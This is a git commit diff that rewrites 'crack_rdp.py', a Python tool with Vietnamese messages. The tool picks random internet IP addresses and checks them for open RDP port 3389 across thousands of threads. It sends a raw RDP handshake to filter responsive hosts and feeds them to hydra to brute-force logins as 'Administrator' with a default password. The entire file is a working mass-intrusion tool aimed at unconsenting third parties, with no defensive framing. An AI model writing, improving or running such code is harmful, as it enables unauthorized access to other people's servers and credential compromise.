4160fcd15fdeafa7f166b3abff547f3e6980bc37
Phu Hoang <152080248+PhuHoangTruong0208@users.noreply.github.com>
2024-04-23 16:00:29 +0700

    Update crack_rdp.py

--- crack_rdp.py
+++ crack_rdp.py
@@ -1,115 +1,66 @@
-import threading
 import random
 import socket
-import time
+import threading
 import os
 import platform
 
 system_name = platform.system()
+print("tool dùng hạn chế trên window") if system_name in "Windows" else print("tải hydra về trước khi dùng 'sudo apt install hydra'")
 
-class ScaningIP:
-    def __init__(self, port=3389, path="server.txt", thread_num=1000, user="Aaron", password="123456"):
-        self.port = port
-        self.path = path
-        self.thread_num = thread_num
-        self.user = user
+class BruteForceVPS:
+    def __init__(self, username="Administrator", password="123456", targets_ip_path="targets.txt", hydra_output="hydra_output.txt"):
+        self.username = username
         self.password = password
+        self.hydra_output = hydra_output
+        self.targets_ip_path = targets_ip_path
+        self.ip_log = []
 
-
-    # hàm tấn công
-    def attack(self, ip):
-        rdp_result = os.popen(f"hydra -t 1 -l {self.user} -p {self.password} rdp://{ip}").read()
-        rdp_result = int(rdp_result.split("completed, ")[1].split(" valid password")[0])
-        if rdp_result == 1:
-            return True
-        else:
-            return False
-
-    # dò ip rdp
     def random_ip(self):
-        g1 = str(random.choice([i for i in range(253)]))
-        g2 = str(random.choice([i for i in range(253)]))
-        g3 = str(random.choice([i for i in range(253)]))
-        g4 = str(random.choice([i for i in range(253)]))
-        return f"{g1}.{g2}.{g3}.{g4}"
-
-    def collect_rdp(self):
         while True:
+            g1 = str(random.choice([i for i in range(253)]))
+            g2 = str(random.choice([i for i in range(253)]))
+            g3 = str(random.choice([i for i in range(253)]))
+            g4 = str(random.choice([i for i in range(253)]))
+            return f"{g1}.{g2}.{g3}.{g4}"
+
+    def check_rdp(self):
+        try:
             ip = self.random_ip()
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(1)
-                check_result = s.connect_ex((ip, self.port))
-                if check_result == 0:
-                    print(f"IP: {ip} Trạng thái: Mở")
+            session = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            session.settimeout(1)
+            check_result = session.connect_ex((ip, 3389))
+            if check_result == 0 and ip not in self.ip_log:
+                self.ip_log.append(ip)
+                session.send(b"\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00")
+                response = session.recv(1024)
+                filter_rdp_non_verify = [b"\x03\x00\x00\x13\x0e\xd0\x00\x00\x124\x00\x02\x1f\x08\x00\x02\x00\x00\x00",
+                                        b"\x03\x00\x00\x13\x0e\xd0\x00\x00\x124\x00\x02\x0f\x08\x00\x02\x00\x00\x00"]
+                if response in filter_rdp_non_verify:
+                    print(f"đã tìm thấy {ip}")
+                    with open(self.targets_ip_path, "a", encoding="utf-8") as file:
+                        file.write(f"{ip}\n")
+        except:
+            pass
 
-                    # tấn công
-                    attack_result = self.attack(ip=ip)
-                    if attack_result == True:
-                        print("tấn công thành công")
-                        with open(self.path, mode="a", encoding="utf-8") as file:
-                             file.write(ip+"\n")
-                    else:
-                        print("tấn công không thành công")
-
-                s.close()
-            except Exception as e:
-                pass
+    def multi_thread_scan(self, thread_num=5000):
+        for _ in range(thread_num):
+            thread = threading.Thread(target=self.check_rdp)
+            thread.start()
 
     def scan_ip(self):
-        threads = []
-        for _ in range(self.thread_num):
-            time.sleep(0.01)
-            scan = threading.Thread(target=self.collect_rdp)
-            threads.append(scan)
-            scan.start()
-        for thread in threads:
-            thread.join()
-
-    # lọc ra các ip rdp không có mật khẩu
-    def filter_non_verify_ip(self):
-        from pywinauto.application import Application
-        with open(self.path, mode="r", encoding="utf-8") as file:
-            IPs = file.read().splitlines()
-        
-        rdp_path = "mstsc.exe"
-        app = Application(backend="uia").start(rdp_path)
-        for ip in IPs:
-            window = app.window(title="Remote Desktop Connection")
-            write_ip = window.child_window(title="Computer:", control_type="Edit").wrapper_object()
-            write_ip.type_keys(ip.strip())
-            connect = window.child_window(title="Connect", control_type="Button").wrapper_object()
-            connect.click()
-            try:
-                check_connect = window.child_window(title="Yes")
-                if check_connect.is_visible():
-                    print("Đây không phải là một VPS hợp lệ.")
-                    close = window.child_window(title="No", control_type="Button")
-                    close.click()
-                    continue
-            except:
-                input("Đã tìm thấy, vui lòng nhập pass và user để thử. sau đó enter để tiếp tục : ")
-                app.kill()
-                app = Application(backend="uia").start(rdp_path)
-                continue
-
-
-def command_line():
-    def attack():
-        thread_num = int(input("nhập số luồng : "))
-        user = input('nhập user, nếu không mặc định là Aaron, nhấn "d" để mặc định: ').strip()
-        if user in "d":
-            pass
-        password = input('nhập password, mặc định là 12345, nhấn "d" để mặc định : ').strip()
-        if password in "d":
-            pass
-        ScaningIP(thread_num=thread_num, user="Aaron", password="12345").scan_ip()
-    def filter():
-        ScaningIP().filter_non_verify_ip()
+        self.multi_thread_scan()
     
-    inp = input("1 - attack (only linux)\n2 - lọc ip (only window) * chắc rằng tệp có IPs\nhãy chọn lựa trọn trên : ").strip()
-    if inp in "1":
-        attack()
-    else:
-        filter()
-command_line()
+    def hydra_attack(self, hydra_thread=1):
+        os.system(f"hydra -t {hydra_thread} -l {self.username} -p {self.password} -M {self.targets_ip_path} -o {self.hydra_output} rdp")
+    
+
+    def run(self):
+        while True:
+            if os.path.exists(self.targets_ip_path) == True:
+                os.remove(self.targets_ip_path)
+            for _ in range(100):
+                self.scan_ip()
+            self.hydra_attack()
+
+brute = BruteForceVPS()
+brute.run()
